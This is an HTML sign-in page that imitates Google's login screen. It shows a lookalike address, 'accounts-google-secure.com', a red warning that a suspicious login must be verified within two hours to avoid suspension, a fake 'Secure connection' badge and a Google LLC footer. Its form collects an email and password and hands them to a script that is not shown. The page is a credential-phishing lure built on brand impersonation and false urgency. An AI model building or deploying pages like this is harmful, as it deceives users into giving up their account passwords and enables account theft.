<!DOCTYPE html>
<html>
<head>
    <title>Sign in</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <p style="font-size:12px; color:gray;">
    https://accounts-google-secure.com/login
</p>

    <div class="login-box">
        <h2 style="text-align:left;">Sign in</h2>
<p style="text-align:left; color:gray;">Use your account</p>
        <p style="color:red; font-size:14px;">
    ⚠️ Suspicious login detected. Verify within 2 hours to avoid account suspension.
</p>

        <form onsubmit="handleLogin(event)">
            <input type="text" placeholder="Email or phone" required><br><br>
            <p style="font-size:13px; color:#1a73e8; cursor:pointer;">
    Forgot email?
</p>
            <input type="password" placeholder="Password" required><br><br>
            <p style="font-size:12px; color:gray;">
    🔒 Secure connection
</p>

            <button type="submit">Next</button>
        </form>
        <p style="font-size:12px; color:gray; margin-top:15px;">
        Google LLC, 2026
    </p>
    </div>

    <script src="script.js"></script>
</body>
</html>
